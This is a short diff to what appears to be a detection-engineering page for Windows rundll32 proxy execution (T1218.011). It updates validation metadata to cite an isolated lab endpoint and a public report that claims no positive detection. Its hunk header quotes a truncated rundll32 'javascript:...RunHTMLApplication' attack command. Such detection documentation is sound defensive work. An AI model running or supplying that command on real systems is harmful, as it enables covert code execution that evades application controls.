@@ -62,8 +62,8 @@ rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20
 ```
 
 
-**Validated**: 2026-04-29 by manual reproduction on lab host `win10-sysmon-client`
-**Evidence**: [`tests/atomic/evidence/T1218.011-rundll32.png`](../tests/atomic/evidence/T1218.011-rundll32.png)
+**Validated**: 2026-04-29 by manual reproduction on an isolated Windows lab endpoint.
+**Public evidence**: [aggregate validation report](../artifacts/public/live-detection-validation-20260806.json). Dispatch completed without error; no positive scenario is claimed for that published campaign.
 **Latency observed**: < 30 seconds
 
 ## Response
